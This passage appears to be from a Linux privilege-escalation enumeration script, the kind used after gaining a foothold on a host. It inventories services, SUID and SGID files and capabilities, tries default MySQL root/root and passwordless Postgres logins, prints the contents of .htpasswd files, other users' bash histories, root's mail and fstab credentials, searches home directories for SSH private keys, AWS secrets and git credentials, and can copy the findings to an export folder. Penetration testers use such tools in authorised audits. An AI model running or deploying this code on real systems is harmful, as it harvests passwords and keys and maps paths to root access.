  echo -e "\e[00;31m[-] Jobs held by all users:\e[00m\n$cronother" 
  echo -e "\n"
fi

# list systemd timers
if [ "$thorough" = "1" ]; then
  # include inactive timers in thorough mode
  systemdtimers="$(systemctl list-timers --all 2>/dev/null)"
  info=""
else
  systemdtimers="$(systemctl list-timers 2>/dev/null |head -n -1 2>/dev/null)"
  # replace the info in the output with a hint towards thorough mode
  info="\e[2mEnable thorough tests to see inactive timers\e[00m"
fi
if [ "$systemdtimers" ]; then
  echo -e "\e[00;31m[-] Systemd timers:\e[00m\n$systemdtimers\n$info"
  echo -e "\n"
fi

}

networking_info()
{
echo -e "\e[00;33m### NETWORKING  ##########################################\e[00m" 

#nic information
nicinfo=`/sbin/ifconfig -a 2>/dev/null`
if [ "$nicinfo" ]; then
  echo -e "\e[00;31m[-] Network and IP info:\e[00m\n$nicinfo" 
  echo -e "\n"
fi

#nic information (using ip)
nicinfoip=`/sbin/ip a 2>/dev/null`
if [ ! "$nicinfo" ] && [ "$nicinfoip" ]; then
  echo -e "\e[00;31m[-] Network and IP info:\e[00m\n$nicinfoip" 
  echo -e "\n"
fi

arpinfo=`arp -a 2>/dev/null`
if [ "$arpinfo" ]; then
  echo -e "\e[00;31m[-] ARP history:\e[00m\n$arpinfo" 
  echo -e "\n"
fi

arpinfoip=`ip n 2>/dev/null`
if [ ! "$arpinfo" ] && [ "$arpinfoip" ]; then
  echo -e "\e[00;31m[-] ARP history:\e[00m\n$arpinfoip" 
  echo -e "\n"
fi

#dns settings
nsinfo=`grep "nameserver" /etc/resolv.conf 2>/dev/null`
if [ "$nsinfo" ]; then
  echo -e "\e[00;31m[-] Nameserver(s):\e[00m\n$nsinfo" 
  echo -e "\n"
fi

nsinfosysd=`systemd-resolve --status 2>/dev/null`
if [ "$nsinfosysd" ]; then
  echo -e "\e[00;31m[-] Nameserver(s):\e[00m\n$nsinfosysd" 
  echo -e "\n"
fi

#default route configuration
defroute=`route 2>/dev/null | grep default`
if [ "$defroute" ]; then
  echo -e "\e[00;31m[-] Default route:\e[00m\n$defroute" 
  echo -e "\n"
fi

#default route configuration
defrouteip=`ip r 2>/dev/null | grep default`
if [ ! "$defroute" ] && [ "$defrouteip" ]; then
  echo -e "\e[00;31m[-] Default route:\e[00m\n$defrouteip" 
  echo -e "\n"
fi

#listening TCP
tcpservs=`netstat -antp 2>/dev/null`
if [ "$tcpservs" ]; then
  echo -e "\e[00;31m[-] Listening TCP:\e[00m\n$tcpservs" 
  echo -e "\n"
fi

tcpservsip=`ss -t 2>/dev/null`
if [ ! "$tcpservs" ] && [ "$tcpservsip" ]; then
  echo -e "\e[00;31m[-] Listening TCP:\e[00m\n$tcpservsip" 
  echo -e "\n"
fi

#listening UDP
udpservs=`netstat -anup 2>/dev/null`
if [ "$udpservs" ]; then
  echo -e "\e[00;31m[-] Listening UDP:\e[00m\n$udpservs" 
  echo -e "\n"
fi

udpservsip=`ip -u 2>/dev/null`
if [ ! "$udpservs" ] && [ "$udpservsip" ]; then
  echo -e "\e[00;31m[-] Listening UDP:\e[00m\n$udpservsip" 
  echo -e "\n"
fi
}

services_info()
{
echo -e "\e[00;33m### SERVICES #############################################\e[00m" 

#running processes
psaux=`ps aux 2>/dev/null`
if [ "$psaux" ]; then
  echo -e "\e[00;31m[-] Running processes:\e[00m\n$psaux" 
  echo -e "\n"
fi

#lookup process binary path and permissisons
procperm=`ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null`
if [ "$procperm" ]; then
  echo -e "\e[00;31m[-] Process binaries and associated permissions (from above list):\e[00m\n$procperm" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$procperm" ]; then
procpermbase=`ps aux 2>/dev/null | awk '{print $11}' | xargs -r ls 2>/dev/null | awk '!x[$0]++' 2>/dev/null`
  mkdir $format/ps-export/ 2>/dev/null
  for i in $procpermbase; do cp --parents $i $format/ps-export/; done 2>/dev/null
fi

#anything 'useful' in inetd.conf
inetdread=`cat /etc/inetd.conf 2>/dev/null`
if [ "$inetdread" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/inetd.conf:\e[00m\n$inetdread" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$inetdread" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/inetd.conf $format/etc-export/inetd.conf 2>/dev/null
fi

#very 'rough' command to extract associated binaries from inetd.conf & show permisisons of each
inetdbinperms=`awk '{print $7}' /etc/inetd.conf 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$inetdbinperms" ]; then
  echo -e "\e[00;31m[-] The related inetd binary permissions:\e[00m\n$inetdbinperms" 
  echo -e "\n"
fi

xinetdread=`cat /etc/xinetd.conf 2>/dev/null`
if [ "$xinetdread" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/xinetd.conf:\e[00m\n$xinetdread" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$xinetdread" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/xinetd.conf $format/etc-export/xinetd.conf 2>/dev/null
fi

xinetdincd=`grep "/etc/xinetd.d" /etc/xinetd.conf 2>/dev/null`
if [ "$xinetdincd" ]; then
  echo -e "\e[00;31m[-] /etc/xinetd.d is included in /etc/xinetd.conf - associated binary permissions are listed below:\e[00m"; ls -la /etc/xinetd.d 2>/dev/null 
  echo -e "\n"
fi

#very 'rough' command to extract associated binaries from xinetd.conf & show permisisons of each
xinetdbinperms=`awk '{print $7}' /etc/xinetd.conf 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$xinetdbinperms" ]; then
  echo -e "\e[00;31m[-] The related xinetd binary permissions:\e[00m\n$xinetdbinperms" 
  echo -e "\n"
fi

initdread=`ls -la /etc/init.d 2>/dev/null`
if [ "$initdread" ]; then
  echo -e "\e[00;31m[-] /etc/init.d/ binary permissions:\e[00m\n$initdread" 
  echo -e "\n"
fi

#init.d files NOT belonging to root!
initdperms=`find /etc/init.d/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$initdperms" ]; then
  echo -e "\e[00;31m[-] /etc/init.d/ files not belonging to root:\e[00m\n$initdperms" 
  echo -e "\n"
fi

rcdread=`ls -la /etc/rc.d/init.d 2>/dev/null`
if [ "$rcdread" ]; then
  echo -e "\e[00;31m[-] /etc/rc.d/init.d binary permissions:\e[00m\n$rcdread" 
  echo -e "\n"
fi

#init.d files NOT belonging to root!
rcdperms=`find /etc/rc.d/init.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$rcdperms" ]; then
  echo -e "\e[00;31m[-] /etc/rc.d/init.d files not belonging to root:\e[00m\n$rcdperms" 
  echo -e "\n"
fi

usrrcdread=`ls -la /usr/local/etc/rc.d 2>/dev/null`
if [ "$usrrcdread" ]; then
  echo -e "\e[00;31m[-] /usr/local/etc/rc.d binary permissions:\e[00m\n$usrrcdread" 
  echo -e "\n"
fi

#rc.d files NOT belonging to root!
usrrcdperms=`find /usr/local/etc/rc.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$usrrcdperms" ]; then
  echo -e "\e[00;31m[-] /usr/local/etc/rc.d files not belonging to root:\e[00m\n$usrrcdperms" 
  echo -e "\n"
fi

initread=`ls -la /etc/init/ 2>/dev/null`
if [ "$initread" ]; then
  echo -e "\e[00;31m[-] /etc/init/ config file permissions:\e[00m\n$initread"
  echo -e "\n"
fi

# upstart scripts not belonging to root
initperms=`find /etc/init \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$initperms" ]; then
   echo -e "\e[00;31m[-] /etc/init/ config files not belonging to root:\e[00m\n$initperms"
   echo -e "\n"
fi

systemdread=`ls -lthR /lib/systemd/ 2>/dev/null`
if [ "$systemdread" ]; then
  echo -e "\e[00;31m[-] /lib/systemd/* config file permissions:\e[00m\n$systemdread"
  echo -e "\n"
fi

# systemd files not belonging to root
systemdperms=`find /lib/systemd/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$systemdperms" ]; then
   echo -e "\e[00;33m[+] /lib/systemd/* config files not belonging to root:\e[00m\n$systemdperms"
   echo -e "\n"
fi
}

software_configs()
{
echo -e "\e[00;33m### SOFTWARE #############################################\e[00m" 

#sudo version - check to see if there are any known vulnerabilities with this
sudover=`sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null`
if [ "$sudover" ]; then
  echo -e "\e[00;31m[-] Sudo version:\e[00m\n$sudover" 
  echo -e "\n"
fi

#mysql details - if installed
mysqlver=`mysql --version 2>/dev/null`
if [ "$mysqlver" ]; then
  echo -e "\e[00;31m[-] MYSQL version:\e[00m\n$mysqlver" 
  echo -e "\n"
fi

#checks to see if root/root will get us a connection
mysqlconnect=`mysqladmin -uroot -proot version 2>/dev/null`
if [ "$mysqlconnect" ]; then
  echo -e "\e[00;33m[+] We can connect to the local MYSQL service with default root/root credentials!\e[00m\n$mysqlconnect" 
  echo -e "\n"
fi

#mysql version details
mysqlconnectnopass=`mysqladmin -uroot version 2>/dev/null`
if [ "$mysqlconnectnopass" ]; then
  echo -e "\e[00;33m[+] We can connect to the local MYSQL service as 'root' and without a password!\e[00m\n$mysqlconnectnopass" 
  echo -e "\n"
fi

#postgres details - if installed
postgver=`psql -V 2>/dev/null`
if [ "$postgver" ]; then
  echo -e "\e[00;31m[-] Postgres version:\e[00m\n$postgver" 
  echo -e "\n"
fi

#checks to see if any postgres password exists and connects to DB 'template0' - following commands are a variant on this
postcon1=`psql -U postgres template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon1" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'postgres' with no password!:\e[00m\n$postcon1" 
  echo -e "\n"
fi

postcon11=`psql -U postgres template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon11" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'postgres' with no password!:\e[00m\n$postcon11" 
  echo -e "\n"
fi

postcon2=`psql -U pgsql template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon2" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'psql' with no password!:\e[00m\n$postcon2" 
  echo -e "\n"
fi

postcon22=`psql -U pgsql template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon22" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'psql' with no password!:\e[00m\n$postcon22" 
  echo -e "\n"
fi

#apache details - if installed
apachever=`apache2 -v 2>/dev/null; httpd -v 2>/dev/null`
if [ "$apachever" ]; then
  echo -e "\e[00;31m[-] Apache version:\e[00m\n$apachever" 
  echo -e "\n"
fi

#what account is apache running under
apacheusr=`grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null |awk '{sub(/.*\export /,"")}1' 2>/dev/null`
if [ "$apacheusr" ]; then
  echo -e "\e[00;31m[-] Apache user configuration:\e[00m\n$apacheusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$apacheusr" ]; then
  mkdir --parents $format/etc-export/apache2/ 2>/dev/null
  cp /etc/apache2/envvars $format/etc-export/apache2/envvars 2>/dev/null
fi

#installed apache modules
apachemodules=`apache2ctl -M 2>/dev/null; httpd -M 2>/dev/null`
if [ "$apachemodules" ]; then
  echo -e "\e[00;31m[-] Installed Apache modules:\e[00m\n$apachemodules" 
  echo -e "\n"
fi

#htpasswd check
htpasswd=`find / -name .htpasswd -print -exec cat {} \; 2>/dev/null`
if [ "$htpasswd" ]; then
    echo -e "\e[00;33m[-] htpasswd found - could contain passwords:\e[00m\n$htpasswd"
    echo -e "\n"
fi

#anything in the default http home dirs (a thorough only check as output can be large)
if [ "$thorough" = "1" ]; then
  apachehomedirs=`ls -alhR /var/www/ 2>/dev/null; ls -alhR /srv/www/htdocs/ 2>/dev/null; ls -alhR /usr/local/www/apache2/data/ 2>/dev/null; ls -alhR /opt/lampp/htdocs/ 2>/dev/null`
  if [ "$apachehomedirs" ]; then
    echo -e "\e[00;31m[-] www home dir contents:\e[00m\n$apachehomedirs" 
    echo -e "\n"
  fi
fi

}

interesting_files()
{
echo -e "\e[00;33m### INTERESTING FILES ####################################\e[00m" 

#checks to see if various files are installed
echo -e "\e[00;31m[-] Useful file locations:\e[00m" ; which nc 2>/dev/null ; which netcat 2>/dev/null ; which wget 2>/dev/null ; which nmap 2>/dev/null ; which gcc 2>/dev/null; which curl 2>/dev/null 
echo -e "\n" 

#limited search for installed compilers
compiler=`dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null`
if [ "$compiler" ]; then
  echo -e "\e[00;31m[-] Installed compilers:\e[00m\n$compiler" 
  echo -e "\n"
fi

#manual check - lists out sensitive files, can we read/modify etc.
echo -e "\e[00;31m[-] Can we read/write sensitive files:\e[00m" ; ls -la /etc/passwd 2>/dev/null ; ls -la /etc/group 2>/dev/null ; ls -la /etc/profile 2>/dev/null; ls -la /etc/shadow 2>/dev/null ; ls -la /etc/master.passwd 2>/dev/null 
echo -e "\n" 

#search for suid files
findsuid=`find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$findsuid" ]; then
  echo -e "\e[00;31m[-] SUID files:\e[00m\n$findsuid" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$findsuid" ]; then
  mkdir $format/suid-files/ 2>/dev/null
  for i in $findsuid; do cp $i $format/suid-files/; done 2>/dev/null
fi

#list of 'interesting' suid files - feel free to make additions
intsuid=`find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$intsuid" ]; then
  echo -e "\e[00;33m[+] Possibly interesting SUID files:\e[00m\n$intsuid" 
  echo -e "\n"
fi

#lists word-writable suid files
wwsuid=`find / -perm -4007 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsuid" ]; then
  echo -e "\e[00;33m[+] World-writable SUID files:\e[00m\n$wwsuid" 
  echo -e "\n"
fi

#lists world-writable suid files owned by root
wwsuidrt=`find / -uid 0 -perm -4007 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsuidrt" ]; then
  echo -e "\e[00;33m[+] World-writable SUID files owned by root:\e[00m\n$wwsuidrt" 
  echo -e "\n"
fi

#search for sgid files
findsgid=`find / -perm -2000 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$findsgid" ]; then
  echo -e "\e[00;31m[-] SGID files:\e[00m\n$findsgid" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$findsgid" ]; then
  mkdir $format/sgid-files/ 2>/dev/null
  for i in $findsgid; do cp $i $format/sgid-files/; done 2>/dev/null
fi

#list of 'interesting' sgid files
intsgid=`find / -perm -2000 -type f  -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$intsgid" ]; then
  echo -e "\e[00;33m[+] Possibly interesting SGID files:\e[00m\n$intsgid" 
  echo -e "\n"
fi

#lists world-writable sgid files
wwsgid=`find / -perm -2007 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsgid" ]; then
  echo -e "\e[00;33m[+] World-writable SGID files:\e[00m\n$wwsgid" 
  echo -e "\n"
fi

#lists world-writable sgid files owned by root
wwsgidrt=`find / -uid 0 -perm -2007 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsgidrt" ]; then
  echo -e "\e[00;33m[+] World-writable SGID files owned by root:\e[00m\n$wwsgidrt" 
  echo -e "\n"
fi

#list all files with POSIX capabilities set along with there capabilities
fileswithcaps=`getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null`
if [ "$fileswithcaps" ]; then
  echo -e "\e[00;31m[+] Files with POSIX capabilities set:\e[00m\n$fileswithcaps"
  echo -e "\n"
fi

if [ "$export" ] && [ "$fileswithcaps" ]; then
  mkdir $format/files_with_capabilities/ 2>/dev/null
  for i in $fileswithcaps; do cp $i $format/files_with_capabilities/; done 2>/dev/null
fi

#searches /etc/security/capability.conf for users associated capapilies
userswithcaps=`grep -v '^#\|none\|^$' /etc/security/capability.conf 2>/dev/null`
if [ "$userswithcaps" ]; then
  echo -e "\e[00;33m[+] Users with specific POSIX capabilities:\e[00m\n$userswithcaps"
  echo -e "\n"
fi

if [ "$userswithcaps" ] ; then
#matches the capabilities found associated with users with the current user
matchedcaps=`echo -e "$userswithcaps" | grep \`whoami\` | awk '{print $1}' 2>/dev/null`
	if [ "$matchedcaps" ]; then
		echo -e "\e[00;33m[+] Capabilities associated with the current user:\e[00m\n$matchedcaps"
		echo -e "\n"
		#matches the files with capapbilities with capabilities associated with the current user
		matchedfiles=`echo -e "$matchedcaps" | while read -r cap ; do echo -e "$fileswithcaps" | grep "$cap" ; done 2>/dev/null`
		if [ "$matchedfiles" ]; then
			echo -e "\e[00;33m[+] Files with the same capabilities associated with the current user (You may want to try abusing those capabilties):\e[00m\n$matchedfiles"
			echo -e "\n"
			#lists the permissions of the files having the same capabilies associated with the current user
			matchedfilesperms=`echo -e "$matchedfiles" | awk '{print $1}' | while read -r f; do ls -la $f ;done 2>/dev/null`
			echo -e "\e[00;33m[+] Permissions of files with the same capabilities associated with the current user:\e[00m\n$matchedfilesperms"
			echo -e "\n"
			if [ "$matchedfilesperms" ]; then
				#checks if any of the files with same capabilities associated with the current user is writable
				writablematchedfiles=`echo -e "$matchedfiles" | awk '{print $1}' | while read -r f; do find $f -writable -exec ls -la {} + ;done 2>/dev/null`
				if [ "$writablematchedfiles" ]; then
					echo -e "\e[00;33m[+] User/Group writable files with the same capabilities associated with the current user:\e[00m\n$writablematchedfiles"
					echo -e "\n"
				fi
			fi
		fi
	fi
fi

#look for private keys - thanks djhohnstein
if [ "$thorough" = "1" ]; then
privatekeyfiles=`grep -rl "PRIVATE KEY-----" /home 2>/dev/null`
	if [ "$privatekeyfiles" ]; then
  		echo -e "\e[00;33m[+] Private SSH keys found!:\e[00m\n$privatekeyfiles"
  		echo -e "\n"
	fi
fi

#look for AWS keys - thanks djhohnstein
if [ "$thorough" = "1" ]; then
awskeyfiles=`grep -rli "aws_secret_access_key" /home 2>/dev/null`
	if [ "$awskeyfiles" ]; then
  		echo -e "\e[00;33m[+] AWS secret keys found!:\e[00m\n$awskeyfiles"
  		echo -e "\n"
	fi
fi

#look for git credential files - thanks djhohnstein
if [ "$thorough" = "1" ]; then
gitcredfiles=`find / -name ".git-credentials" 2>/dev/null`
	if [ "$gitcredfiles" ]; then
  		echo -e "\e[00;33m[+] Git credentials saved on the machine!:\e[00m\n$gitcredfiles"
  		echo -e "\n"
	fi
fi

#list all world-writable files excluding /proc and /sys
if [ "$thorough" = "1" ]; then
wwfiles=`find / ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f -exec ls -la {} 2>/dev/null \;`
	if [ "$wwfiles" ]; then
		echo -e "\e[00;31m[-] World-writable files (excluding /proc and /sys):\e[00m\n$wwfiles" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$wwfiles" ]; then
		mkdir $format/ww-files/ 2>/dev/null
		for i in $wwfiles; do cp --parents $i $format/ww-files/; done 2>/dev/null
	fi
fi

#are any .plan files accessible in /home (could contain useful information)
usrplan=`find /home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$usrplan" ]; then
  echo -e "\e[00;31m[-] Plan file permissions and contents:\e[00m\n$usrplan" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$usrplan" ]; then
  mkdir $format/plan_files/ 2>/dev/null
  for i in $usrplan; do cp --parents $i $format/plan_files/; done 2>/dev/null
fi

bsdusrplan=`find /usr/home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$bsdusrplan" ]; then
  echo -e "\e[00;31m[-] Plan file permissions and contents:\e[00m\n$bsdusrplan" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$bsdusrplan" ]; then
  mkdir $format/plan_files/ 2>/dev/null
  for i in $bsdusrplan; do cp --parents $i $format/plan_files/; done 2>/dev/null
fi

#are there any .rhosts files accessible - these may allow us to login as another user etc.
rhostsusr=`find /home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$rhostsusr" ]; then
  echo -e "\e[00;33m[+] rhost config file(s) and file contents:\e[00m\n$rhostsusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$rhostsusr" ]; then
  mkdir $format/rhosts/ 2>/dev/null
  for i in $rhostsusr; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

bsdrhostsusr=`find /usr/home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$bsdrhostsusr" ]; then
  echo -e "\e[00;33m[+] rhost config file(s) and file contents:\e[00m\n$bsdrhostsusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$bsdrhostsusr" ]; then
  mkdir $format/rhosts 2>/dev/null
  for i in $bsdrhostsusr; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

rhostssys=`find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$rhostssys" ]; then
  echo -e "\e[00;33m[+] Hosts.equiv file and contents: \e[00m\n$rhostssys" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$rhostssys" ]; then
  mkdir $format/rhosts/ 2>/dev/null
  for i in $rhostssys; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

#list nfs shares/permisisons etc.
nfsexports=`ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null`
if [ "$nfsexports" ]; then
  echo -e "\e[00;31m[-] NFS config details: \e[00m\n$nfsexports" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$nfsexports" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/exports $format/etc-export/exports 2>/dev/null
fi

if [ "$thorough" = "1" ]; then
  #phackt
  #displaying /etc/fstab
  fstab=`cat /etc/fstab 2>/dev/null`
  if [ "$fstab" ]; then
    echo -e "\e[00;31m[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems\e[00m"
    echo -e "$fstab"
    echo -e "\n"
  fi
fi

#looking for credentials in /etc/fstab
fstab=`grep username /etc/fstab 2>/dev/null |awk '{sub(/.*\username=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo username: 2>/dev/null; grep password /etc/fstab 2>/dev/null |awk '{sub(/.*\password=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo password: 2>/dev/null; grep domain /etc/fstab 2>/dev/null |awk '{sub(/.*\domain=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo domain: 2>/dev/null`
if [ "$fstab" ]; then
  echo -e "\e[00;33m[+] Looks like there are credentials in /etc/fstab!\e[00m\n$fstab"
  echo -e "\n"
fi

if [ "$export" ] && [ "$fstab" ]; then
  mkdir $format/etc-exports/ 2>/dev/null
  cp /etc/fstab $format/etc-exports/fstab done 2>/dev/null
fi

fstabcred=`grep cred /etc/fstab 2>/dev/null |awk '{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1' 2>/dev/null | xargs -I{} sh -c 'ls -la {}; cat {}' 2>/dev/null`
if [ "$fstabcred" ]; then
    echo -e "\e[00;33m[+] /etc/fstab contains a credentials file!\e[00m\n$fstabcred" 
    echo -e "\n"
fi

if [ "$export" ] && [ "$fstabcred" ]; then
  mkdir $format/etc-exports/ 2>/dev/null
  cp /etc/fstab $format/etc-exports/fstab done 2>/dev/null
fi

#use supplied keyword and cat *.conf files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ]; then
  echo -e "[-] Can't search *.conf files as no keyword was entered\n" 
  else
    confkey=`find / -maxdepth 4 -name *.conf -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$confkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .conf files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$confkey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .conf files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .conf files" 
	echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ]; then
  :
  else
    if [ "$export" ] && [ "$confkey" ]; then
	  confkeyfile=`find / -maxdepth 4 -name *.conf -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/config_files/ 2>/dev/null
      for i in $confkeyfile; do cp --parents $i $format/keyword_file_matches/config_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.php files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ]; then
  echo -e "[-] Can't search *.php files as no keyword was entered\n" 
  else
    phpkey=`find / -maxdepth 10 -name *.php -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$phpkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .php files (recursive 10 levels - output format filepath:identified line number where keyword appears):\e[00m\n$phpkey" 
      echo -e "\n" 
     else 
  echo -e "\e[00;31m[-] Find keyword ($keyword) in .php files (recursive 10 levels):\e[00m" 
  echo -e "'$keyword' not found in any .php files" 
  echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ]; then
  :
  else
    if [ "$export" ] && [ "$phpkey" ]; then
    phpkeyfile=`find / -maxdepth 10 -name *.php -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/php_files/ 2>/dev/null
      for i in $phpkeyfile; do cp --parents $i $format/keyword_file_matches/php_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.log files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ];then
  echo -e "[-] Can't search *.log files as no keyword was entered\n" 
  else
    logkey=`find / -maxdepth 4 -name *.log -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$logkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .log files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$logkey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .log files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .log files"
	echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ];then
  :
  else
    if [ "$export" ] && [ "$logkey" ]; then
      logkeyfile=`find / -maxdepth 4 -name *.log -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
	  mkdir --parents $format/keyword_file_matches/log_files/ 2>/dev/null
      for i in $logkeyfile; do cp --parents $i $format/keyword_file_matches/log_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.ini files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ];then
  echo -e "[-] Can't search *.ini files as no keyword was entered\n" 
  else
    inikey=`find / -maxdepth 4 -name *.ini -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$inikey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .ini files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$inikey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .ini files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .ini files" 
	echo -e "\n"
    fi
fi

if [ "$keyword" = "" ];then
  :
  else
    if [ "$export" ] && [ "$inikey" ]; then
	  inikey=`find / -maxdepth 4 -name *.ini -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/ini_files/ 2>/dev/null
      for i in $inikey; do cp --parents $i $format/keyword_file_matches/ini_files/ ; done 2>/dev/null
  fi
fi

#quick extract of .conf files from /etc - only 1 level
allconf=`find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2>/dev/null`
if [ "$allconf" ]; then
  echo -e "\e[00;31m[-] All *.conf files in /etc (recursive 1 level):\e[00m\n$allconf" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$allconf" ]; then
  mkdir $format/conf-files/ 2>/dev/null
  for i in $allconf; do cp --parents $i $format/conf-files/; done 2>/dev/null
fi

#extract any user history files that are accessible
usrhist=`ls -la ~/.*_history 2>/dev/null`
if [ "$usrhist" ]; then
  echo -e "\e[00;31m[-] Current user's history files:\e[00m\n$usrhist" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$usrhist" ]; then
  mkdir $format/history_files/ 2>/dev/null
  for i in $usrhist; do cp --parents $i $format/history_files/; done 2>/dev/null
fi

#can we read roots *_history files - could be passwords stored etc.
roothist=`ls -la /root/.*_history 2>/dev/null`
if [ "$roothist" ]; then
  echo -e "\e[00;33m[+] Root's history files are accessible!\e[00m\n$roothist" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$roothist" ]; then
  mkdir $format/history_files/ 2>/dev/null
  cp $roothist $format/history_files/ 2>/dev/null
fi

#all accessible .bash_history files in /home
checkbashhist=`find /home -name .bash_history -print -exec cat {} 2>/dev/null \;`
if [ "$checkbashhist" ]; then
  echo -e "\e[00;31m[-] Location and contents (if accessible) of .bash_history file(s):\e[00m\n$checkbashhist"
  echo -e "\n"
fi

#is there any mail accessible
readmail=`ls -la /var/mail 2>/dev/null`
if [ "$readmail" ]; then
  echo -e "\e[00;31m[-] Any interesting mail in /var/mail:\e[00m\n$readmail" 
  echo -e "\n"
fi

#can we read roots mail
readmailroot=`head /var/mail/root 2>/dev/null`
if [ "$readmailroot" ]; then
  echo -e "\e[00;33m[+] We can read /var/mail/root! (snippet below)\e[00m\n$readmailroot" 
  echo -e "\n"
fi

